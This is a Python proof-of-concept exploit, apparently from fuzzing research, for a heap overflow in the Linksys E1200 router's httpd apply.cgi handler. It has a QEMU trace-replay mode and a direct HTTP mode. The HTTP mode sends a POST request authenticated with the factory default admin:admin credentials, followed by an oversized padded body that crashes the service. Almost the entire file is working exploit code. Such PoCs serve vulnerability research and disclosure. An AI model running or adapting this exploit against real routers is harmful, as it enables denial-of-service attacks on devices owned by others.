#!/usr/bin/env python3
"""
PoC: NB-E1200-01 — Linksys E1200 httpd apply.cgi POST body heap overflow

漏洞：POST /apply.cgi 的请求体处理函数未限制读入长度，超长 POST body
      溢出堆缓冲区，破坏 uClibc heap chunk metadata，导致 realloc() 崩溃。

信号：SIGSEGV (signal=11), PC=0x2b498000 (realloc+0x150 in libc.so.0)
      或 SIGBUS (signal=7),  PC=0x0

复现方式：
  1. 直接 replay（依赖 RR-Fuzz trace）：
       python3 poc_e1200_post_overflow.py --mode replay
  2. 真实 HTTP 请求（对运行中的 httpd 发包）：
       python3 poc_e1200_post_overflow.py --mode http --port 8093

CWE: CWE-122 (Heap-based Buffer Overflow)
CVSS 估算: 8.8 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)
凭证: admin:admin (路由器出厂默认值)
"""

import sys
import os
import subprocess
import argparse
import time
import socket
import struct

SIM = "/home/webfuzz/Documents/qemu/linux-user/rr_fuzzing"
BUILD = "/home/webfuzz/Documents/qemu/build"
ROOTFS = f"{SIM}/tests/images/Linksys/rootfs"
TRACE = f"{SIM}/tests/seeds/Linksys_E1200_post.trace"
QEMU = f"{BUILD}/qemu-mipsel"
HTTPD = f"{ROOTFS}/usr/sbin/httpd"


def poc_replay():
    """
    方式一：通过 RR-Fuzz replay 注入超长 POST body，触发 heap overflow。
    EXTEND(1024) + MUTATE_AUX_BUFFER 在 syscall idx=104 注入超长数据。
    """
    sys.path.insert(0, os.path.join(SIM, "fuzzing"))
    from conductor.qemu_executor import QEMUExecutor
    from conductor.mutator import FuzzInstruction, FUZZ_CMD_EXTEND, FUZZ_CMD_MUTATE_AUX_BUFFER

    print("[*] NB-E1200-01 PoC — replay mode")
    print(f"[*] Trace: {TRACE}")
    print(f"[*] Injecting at syscall idx=104 (read POST body, fd=7)")

    # Net-only mutations extracted from crash_w0_000030 (verified NETWORK-EXPLOITABLE by batch_triage)
    # idx=90: light_mutation on network socket fd
    # idx=106: EXTEND(1024) + inject POST HTTP header → overflow POST body heap buffer
    FUZZ_CMD_LIGHT_MUTATION = 10

    payload = (
        b"POST /apply.cgi HTTP/1.1\r\n"
        b"Host: 127.0.0.1\r\n"
        b"Authorization: Basic YWRtaW46YWRtaW4=\r\n"
        b"\r\n"
    )

    instrs = [
        FuzzInstruction(90, FUZZ_CMD_LIGHT_MUTATION, 1,
                        b'\x01\x00\x00\x00',
                        offset=0, size=4, mutation_type='light_mutation'),
        FuzzInstruction(106, FUZZ_CMD_EXTEND, 1,
                        struct.pack('<I', 1024),
                        offset=0, size=4, mutation_type='http_extend'),
        FuzzInstruction(106, FUZZ_CMD_MUTATE_AUX_BUFFER, 1,
                        payload,
                        offset=0, size=len(payload), mutation_type='http_request'),
    ]

    executor = QEMUExecutor(
        qemu_path=QEMU,
        target_binary=HTTPD,
        ld_prefix=ROOTFS,
        target_args="-p 8093",
        persistent_mode=True,
        timeout=15.0,
    )

    try:
        results = executor.execute_fork(
            trace_file=TRACE,
            fork_point=0,
            mutation_variants=[instrs],
            depth=0,
            iteration_id=0,
        )
        if results:
            r = results[0]
            crashed = getattr(r, 'crashed', False)
            sig = getattr(r, 'signal_number', None)
            pc = hex(getattr(r, 'pc', 0) or 0)
            print(f"\n[{'CRASH' if crashed else 'NO CRASH'}] signal={sig} pc={pc}")
            if crashed and sig in (11, 7):
                print("[+] PoC 成功复现 NB-E1200-01")
                print(f"    SIGSEGV/SIGBUS at PC={pc}")
                print(f"    realloc+0x{(int(pc,16) - 0x2b46e000 - 0x29eb0):x} (if QEMU same lib layout)")
            else:
                print("[-] 未崩溃 — 检查 trace 文件和 QEMU 路径")
        else:
            print("[-] execute_fork 无返回结果")
    finally:
        try:
            executor.stop_persistent_qemu()
        except Exception:
            pass


def poc_http(port: int):
    """
    方式二：直接向运行中的 httpd 发送超长 POST body。
    需要先启动 httpd:
      QEMU_LD_PREFIX=<rootfs> qemu-mipsel -L <rootfs> httpd -p <port>
    """
    print(f"[*] NB-E1200-01 PoC — HTTP direct mode (port={port})")
    print(f"[*] Target: http://127.0.0.1:{port}/apply.cgi")

    # 超长 POST body: 原始 67 字节缓冲区，注入 1024 字节 'A'
    post_body = b"submit_button=Routing&action=Apply&change_action=&next_page=Routing.asp&need_reboot=0&" + b"A" * 937

    request = (
        f"POST /apply.cgi HTTP/1.1\r\n"
        f"Host: 127.0.0.1:{port}\r\n"
        f"Authorization: Basic YWRtaW46YWRtaW4=\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Referer: http://127.0.0.1:{port}/Routing.asp\r\n"
        f"Content-Length: {len(post_body)}\r\n"
        f"\r\n"
    ).encode() + post_body

    print(f"[*] Sending {len(request)} bytes ({len(post_body)} body bytes)")

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect(("127.0.0.1", port))
        s.sendall(request)
        try:
            resp = s.recv(4096)
            print(f"[*] Response: {resp[:100]}")
            print("[-] httpd 仍在响应 — 可能 Content-Length 限制了读取长度")
        except socket.timeout:
            print("[+] 连接超时（httpd 可能已崩溃）")
        s.close()
    except ConnectionRefusedError:
        print(f"[-] 连接被拒绝：httpd 未在端口 {port} 上运行")
        print(f"    先启动: QEMU_LD_PREFIX={ROOTFS} {QEMU} -L {ROOTFS} {HTTPD} -p {port}")
    except Exception as e:
        print(f"[?] {e}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="PoC NB-E1200-01 Linksys E1200 POST heap overflow")
    parser.add_argument("--mode", choices=["replay", "http"], default="replay",
                        help="replay: 用 RR-Fuzz trace 注入 | http: 直接 HTTP 发包")
    parser.add_argument("--port", type=int, default=8093,
                        help="HTTP 模式下 httpd 监听端口（默认 8093）")
    args = parser.parse_args()

    if args.mode == "replay":
        poc_replay()
    else:
        poc_http(args.port)
